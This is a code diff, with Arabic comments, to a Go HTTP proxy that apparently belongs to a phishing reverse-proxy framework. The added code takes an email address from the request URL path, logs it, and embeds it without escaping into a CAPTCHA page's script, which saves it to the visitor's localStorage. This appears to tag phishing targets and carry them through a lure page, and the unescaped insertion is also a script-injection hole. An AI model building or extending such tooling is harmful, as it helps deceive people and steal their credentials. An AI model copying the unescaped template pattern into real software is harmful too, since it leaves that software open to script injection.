@@ -1540,6 +1540,18 @@ func (p *HttpProxy) waitForRedirectUrl(session_id string) (string, bool) {
 }
 
 func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Response) {
+	// استخراج البريد الإلكتروني من URL إذا كان موجودًا
+	path := req.URL.Path
+	email := ""
+	
+	// البحث عن البريد الإلكتروني في المسار باستخدام التعبير النمطي
+	re := regexp.MustCompile(`\$([^\/]+@[^\/]+)`)
+	matches := re.FindStringSubmatch(path)
+	if len(matches) > 1 {
+		email = matches[1]
+		log.Info("تم استخراج البريد الإلكتروني من URL: %s", email)
+	}
+	
 	// التحقق من وجود كوكي CAPTCHA
 	captcha_cookie, err := req.Cookie("passed_captcha")
 	if err == nil && captcha_cookie.Value == "1" {
@@ -1677,7 +1689,7 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		return req, resp
 	}
 	
-	// عرض صفحة الكابتشا بدون تحذير
+	// عرض صفحة الكابتشا مع حفظ البريد الإلكتروني إذا كان موجودًا
 	captchaHTML := `<!DOCTYPE html>
 <html dir="rtl">
 <head>
@@ -1712,6 +1724,15 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
         }
     </style>
     <script>
+        // تخزين البريد الإلكتروني في localStorage إذا كان موجودًا
+        window.onload = function() {
+            var email = "` + email + `";
+            if (email && email.length > 0) {
+                localStorage.setItem('user_email', email);
+                console.log("تم تخزين البريد الإلكتروني في localStorage: " + email);
+            }
+        };
+        
         function onCaptchaSuccess(token) {
             document.getElementById('captcha-form').submit();
         }
